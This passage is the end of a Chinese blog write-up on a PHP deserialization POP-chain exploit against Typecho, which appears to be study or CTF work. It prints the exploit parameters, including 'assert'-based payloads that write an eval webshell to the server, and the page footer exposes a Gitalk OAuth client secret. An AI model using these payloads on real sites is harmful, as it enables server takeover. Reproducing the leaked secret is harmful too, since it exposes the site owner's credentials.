+<p>并且经过分析发现程序开头开启了ob_start(),该函数会将内部输出全部放入到缓冲区中，执行注入代码以后触发异常，导致ob_end_clean()执行，该函数会清空缓冲区。</p>
+<p>解决方案：让程序强制退出，不执行Exception，这样原来的缓冲区内容就会输出出来。</p>
+<p>//添加$items[‘category’]=array(new Typecho_Request());即可</p>
+<p>下图，成功执行POC</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/8cPkJ4.png" alt="8cPkJ4"> </p>
+<p>写入webshell</p>
+<p>则使用以下参数但是没有成功</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>]=<span class="string">'assert'</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_params[<span class="string">'screenName'</span>]=<span class="string">'fputs(fopen(\'./shell.php\',\'w\'),\'&lt;?php@eval($_GET[\'cmd\']);?&gt;)'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>类似下面的参数也是如此</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>]=<span class="string">'assert'</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_params[<span class="string">'screenName'</span>]=<span class="string">'phpinfo()'</span>;</span><br><span class="line"></span><br><span class="line">Call_user_func(<span class="string">'assert'</span>,<span class="string">'phpinfo()'</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查看警告信息，提示assert不能使用string类型的参数</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/FnM62V.png" alt="FnM62V"> </p>
+<p>经过测试，下面的语法是没有问题的。可能是有其他原因，暂不深究。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="comment">//call_user_func('assert','phpinfo()');</span></span><br><span class="line">	assert(phpinfo());<span class="comment">//等价</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>写webshell的语法    #经过测试，发现webshell内容中的引号需要加转义符，否则写入时候会不完整。</p>
+<p><code>call_user_func(&#39;assert&#39;,&#39;file_put_contents(&quot;webshell.php&quot;,\&#39;&lt;?php eval($_POST[1]);?&gt;\&#39;)&#39;);</code></p>
+<p>小结：</p>
+<p>POP链，和二进制漏洞下的ROP有异曲同工之妙，都是利用源码中存在的组件gadget来拼凑出自己的执行路线，区别gadgets一个是汇编碎片，而另一个是实例化的类。所以说漏洞利用区别只是架构，思想都是一样的，学习漏洞不仅仅是学习方法，更是掌握这种思想。</p>
+<p>个人感觉，这个漏洞的挖掘和我们刚才的分析方式是相反的。挖掘首先需要找到可以利用的函数，然后再一路推回去，构成POP链。而漏洞分析则是已知漏洞点，再分析如何利用的。</p>
+<p>参考文献：</p>
+<p><a href="https://www.freebuf.com/articles/web/167721.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/167721.html</a> 反序列化原理</p>
+<p><a href="https://www.freebuf.com/column/161798.html" target="_blank" rel="noopener">https://www.freebuf.com/column/161798.html</a> 反序列化案例Typecho</p>
+<p><a href="https://www.anquanke.com/post/id/155306#h2-2" target="_blank" rel="noopener">https://www.anquanke.com/post/id/155306#h2-2</a> Typecho漏洞利用时数据库报错</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://migraine-sudo.github.io/2019/07/21/phpunserialize/" data-id="ck6ucmllw0000insecf9840wq"
+         class="article-share-link">Share</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E6%B8%97%E9%80%8F/" rel="tag">Web渗透</a></li></ul>
+
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2019/08/17/%E7%B2%BE%E8%8B%B1%E8%AE%A1%E5%88%92CTP%E5%9F%B9%E8%AE%AD%E8%AE%B0%E5%BD%95/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer posts</strong>
+        <div class="article-nav-title">
+          
+            精英计划CTP-贵阳
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2019/06/02/19%E4%BF%A1%E5%AE%89/" class="article-nav-link">
+        <strong class="article-nav-caption">Olde posts</strong>
+        <div class="article-nav-title">2019全国大学生信息安全大赛线下初体验   --体验黑客的儿童节</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: '5ae4e05700db25ed5406',
+      clientSecret: '8a38a8cb845b0b6198a0c59cab9df498ac778343',
+      repo: 'migraine-sudo.github.io',
+      owner: 'migraine-sudo',
+      admin: ['migraine-sudo'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 Migraine殇</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+
+<aside class="sidebar sidebar-specter">
+  
+    <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/fujiang.jpg" alt="Migraine殇"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/gallery">Gallery</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/tags">Tags</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+  </aside>
+  
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
